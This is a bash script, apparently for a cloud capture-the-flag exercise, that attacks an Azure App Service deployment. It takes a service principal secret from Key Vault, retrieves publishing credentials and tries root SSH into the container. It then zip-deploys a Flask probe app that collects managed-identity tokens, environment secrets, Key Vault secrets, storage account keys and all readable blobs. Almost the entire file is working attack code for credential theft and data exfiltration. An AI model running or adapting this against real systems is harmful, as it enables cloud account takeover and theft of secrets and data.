#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
APP_HOST="app-tbl-reporting-prod.azurewebsites.net"
SHOST="app-tbl-reporting-prod.scm.azurewebsites.net"
SSH_PASS="Docker!"
SSH_USER="root"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

echo "=== TEST PORT 2222 (SSH to App Container) ==="
timeout 5 bash -c "echo '' > /dev/tcp/$SHOST/2222" 2>/dev/null && echo "Port 2222 OPEN" || echo "Port 2222 closed/filtered"

echo ""
echo "=== GET REPORTING-SERVICE CREDENTIALS ==="
RS_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
RS_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
RS_AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$RS_CID" --data-urlencode "client_secret=$RS_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)

PC=$(curl -sS -X POST \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2023-01-01" \
  -H "Authorization: Bearer $RS_AT" -H "Content-Length: 0")
PU=$(echo "$PC" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
PP=$(echo "$PC" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("properties",{}).get("publishingPassword",""))' 2>/dev/null)

echo ""
echo "=== SSH INTO APP CONTAINER ==="
# Install sshpass
sudo apt-get install -y sshpass 2>/dev/null | tail -1

SSH_CMD='env | grep -E "IDENTITY|VAULT|SECRET|FLAG|CONN|STORAGE|KEY"; echo "---IDENTITY PROBE---"; if [ -n "$IDENTITY_ENDPOINT" ]; then TOK=$(curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01&client_id=7a85156a-01c4-4e61-8472-40a92107159b" | python3 -c "import sys,json;print(json.load(sys.stdin).get(\"access_token\",\"\"))"); echo "UAMI_VAULT_LEN=${#TOK}"; if [ -n "$TOK" ]; then echo "KV_SEC_FLAG:"; curl -s -H "Authorization: Bearer $TOK" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"; echo; echo "KV_SEC_LIST:"; curl -s -H "Authorization: Bearer $TOK" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 1000; echo; fi; fi; echo "---STORAGE PROBE---"; if [ -n "$IDENTITY_ENDPOINT" ]; then ST=$(curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource=https://storage.azure.com&api-version=2019-08-01&client_id=7a85156a-01c4-4e61-8472-40a92107159b" | python3 -c "import sys,json;print(json.load(sys.stdin).get(\"access_token\",\"\"))"); echo "UAMI_STOR_LEN=${#ST}"; if [ -n "$ST" ]; then for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do echo "$sa:"; curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://$sa.blob.core.windows.net/?comp=list" | head -c 500; echo; done; fi; fi; echo "DONE"'

# Try SSH on port 2222
if sshpass -V 2>/dev/null; then
  echo "Trying SSH to $SHOST:2222..."
  sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 -o BatchMode=no \
    -p 2222 "$SSH_USER@$SHOST" "$SSH_CMD" 2>&1
  echo "SSH exit: $?"
else
  echo "sshpass not available"
fi

echo ""
echo "=== ALTERNATIVELY: DEPLOY AND FORCE RESTART VIA ORYX ==="
# Create a proper deployment with Oryx-compatible structure
cat > /tmp/probeapp.py << 'PYEOF'
import os,json,urllib.request,urllib.parse,re,base64
from flask import Flask,jsonify
app=Flask(__name__)
UAMI="7a85156a-01c4-4e61-8472-40a92107159b"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
def msi(res,cid=None):
    IE=os.getenv("IDENTITY_ENDPOINT",""); IH=os.getenv("IDENTITY_HEADER","")
    if not IE: return None,"NO_IE"
    u=IE+"?resource="+urllib.parse.quote(res,safe="")+"&api-version=2019-08-01"
    if cid: u+="&client_id="+cid
    try:
        r=urllib.request.Request(u,headers={"X-IDENTITY-HEADER":IH})
        with urllib.request.urlopen(r,timeout=25) as f: return json.loads(f.read()).get("access_token",""),None
    except Exception as e:
        b=""
        try: b=e.read().decode()[:200]
        except: pass
        return None,str(e)[:100]+b
def get(url,tok=None,extra=None):
    h={"Authorization":"Bearer "+tok} if tok else {}
    if extra: h.update(extra)
    try:
        with urllib.request.urlopen(urllib.request.Request(url,headers=h),timeout=25) as r: return r.status,r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")[:800]
    except Exception as e: return 0,str(e)[:200]
def post(url,tok,body=b"{}"):
    h={"Authorization":"Bearer "+tok,"Content-Type":"application/json"}
    try:
        with urllib.request.urlopen(urllib.request.Request(url,headers=h,data=body,method="POST"),timeout=25) as r: return r.status,r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")[:800]
    except Exception as e: return 0,str(e)[:200]
@app.get("/")
def run():
    out={}
    IE=os.getenv("IDENTITY_ENDPOINT",""); IH=os.getenv("IDENTITY_HEADER","")
    out["IE"]=IE; out["IH"]=len(IH)
    for k,v in os.environ.items():
        if re.search(r"DF26\{",v): out["ENV_FLAG_"+k]=v
        if any(x in k for x in ["CONN","STORAGE","VAULT","SECRET","FLAG"]): out["ENV_"+k]=v[:300]
    ALL=[None,UAMI]
    for cid in ALL:
        L=cid[:8] if cid else "sys"
        for res in ["https://vault.azure.net/","https://management.azure.com/","https://storage.azure.com/"]:
            t,err=msi(res,cid)
            rk=res.split(".")[0].split("//")[1]
            out[f"{L}_{rk}_len"]=len(t) if t else 0
            if t:
                if "vault" in res:
                    s,b=get("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4",t)
                    out[f"{L}_kvsec_list"]=(s,b[:2000])
                    if s==200:
                        for sc in json.loads(b).get("value",[]):
                            s2,b2=get(sc["id"]+"?api-version=7.4",t)
                            if s2==200: out["SEC_"+sc["id"].rsplit("/",1)[-1]]=json.loads(b2).get("value","")[:500]
                    s2,b2=get("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4",t)
                    out[f"{L}_kvsec_flag"]=(s2,b2[:500])
                elif "management" in res:
                    for sa in ["sttblbackupprodx3euoz","sttblappcfgprodx3euoz","sttblarchiveprodx3euoz"]:
                        s,b=post(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01",t)
                        if s==200:
                            keys=json.loads(b).get("keys",[])
                            if keys: out[f"{L}_lk_{sa}"]=keys[0].get("value","")[:50]
                        else: out[f"{L}_lk_{sa}"]=s
                    s,b=post(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01",t)
                    out[f"{L}_sf_appsettings"]=(s,b[:3000])
                elif "storage" in res:
                    for sa in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz"]:
                        s,b=get(f"https://{sa}.blob.core.windows.net/?comp=list",t,{"x-ms-version":"2021-08-06"})
                        out[f"{L}_sa_{sa}"]=(s,b[:300])
                        if s==200:
                            for cn in re.findall(r"<Name>(.*?)</Name>",b):
                                s2,b2=get(f"https://{sa}.blob.core.windows.net/{cn}?restype=container&comp=list",t,{"x-ms-version":"2021-08-06"})
                                out[f"{L}_{sa}_{cn}"]=(s2,b2[:500])
                                for bn in re.findall(r"<Name>(.*?)</Name>",b2):
                                    s3,b3=get(f"https://{sa}.blob.core.windows.net/{cn}/{bn}",t,{"x-ms-version":"2021-08-06"})
                                    out[f"BLOB_{sa}_{cn}_{bn}"]=(s3,b3[:5000])
    return jsonify(out)
if __name__=="__main__": app.run("0.0.0.0",8000)
PYEOF
echo "gunicorn --bind=0.0.0.0:8000 probeapp:app" > /tmp/probetart.txt
echo "flask" > /tmp/prob_req.txt

# ZIP deploy with probeapp
cd /tmp
rm -f probedeploy.zip
python3 -c "
import zipfile
with zipfile.ZipFile('probedeploy.zip','w',zipfile.ZIP_DEFLATED) as z:
    z.write('probeapp.py')
    z.write('probetart.txt','startup.txt')
    z.write('prob_req.txt','requirements.txt')
print('ZIP ok')
"

ZD=$(curl -sS -o /dev/null -w '%{http_code}' -u "$PU:$PP" \
  -X POST "https://${SHOST}/api/zipdeploy?isAsync=false&clean=true" \
  -H 'Content-Type: application/zip' \
  --data-binary @/tmp/probedeploy.zip)
echo "ZipDeploy2 status: $ZD"

# Also try ARM restart
RS_RESTART=$(curl -sS -o /dev/null -w '%{http_code}' -X POST \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?softRestart=true&synchronous=false&api-version=2022-03-01" \
  -H "Authorization: Bearer $RS_AT" -H "Content-Length: 0")
echo "ARM restart (softRestart): $RS_RESTART"

echo "Waiting 45s..."
sleep 45

for i in 1 2 3 4 5; do
  RESP=$(curl -sS -m 120 "https://${APP_HOST}/" 2>/dev/null)
  FIRST="${RESP:0:50}"
  echo "Response[$i]: $FIRST"
  if echo "$RESP" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("IE:",d.get("IE",""))' 2>/dev/null; then
    echo "FULL RESULTS:"
    echo "$RESP" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for k,v in sorted(d.items()):
    sv=str(v)
    if sv in ("0","","None","[]","{}",None): continue
    if "NO_IE" in sv or ("timeout" in sv.lower() and "_err" in k): continue
    if all(sv.count(x)==0 for x in ["200","OK","kv","sa","lk","ENV","SEC"]):
        if sv=="(0, \"\")" or sv.strip()=="": continue
    print(f"  {k}: {sv[:500]}")
' 2>/dev/null
    break
  fi
  sleep 10
done

echo ""
echo "=== CHECK WHAT FILES ARE IN WWWROOT ==="
curl -sS -u "$PU:$PP" "https://${SHOST}/api/vfs/home/site/wwwroot/" 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);[print(f["name"],f.get("size","")) for f in d if isinstance(f,dict)]' 2>/dev/null
echo "startup.txt:"
curl -sS -u "$PU:$PP" "https://${SHOST}/api/vfs/home/site/wwwroot/startup.txt" 2>/dev/null

echo "DONE"
